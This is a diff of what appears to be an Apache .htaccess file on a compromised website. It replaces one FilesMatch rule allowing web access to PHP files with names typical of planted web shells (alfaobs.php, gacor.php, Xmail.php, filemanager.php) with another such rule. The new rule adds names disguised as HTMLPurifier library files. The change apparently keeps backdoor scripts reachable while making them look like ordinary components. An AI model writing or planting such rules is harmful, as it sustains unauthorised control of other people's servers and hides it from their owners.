@@ -58,7 +58,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(Configurasi.php|locale.php|alfaobs.php|antimalware.php|filemanager.php|filemanageravatarlitrik.php|kuciyose.php|mulletkaka.php|rudyfilemanagermullet.php|Xmail.php|roleles.php|locales.php|pluginfiles.php|gacor.php|gacir.php|phpmaillocale.php|corodre.php|removed.php|reloless.php|pickarole.php)$">
+<FilesMatch "^(Word.inc.php|HTMLPurifi.inc.php|HTMLPurifier.inc.php|VarParserException.inc.php|XHTML.inc.php|TokenProvider.php|state.php|Submodules.php|locale.php|configurasi.php|phpxmail.php|xmail.php|loacle.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
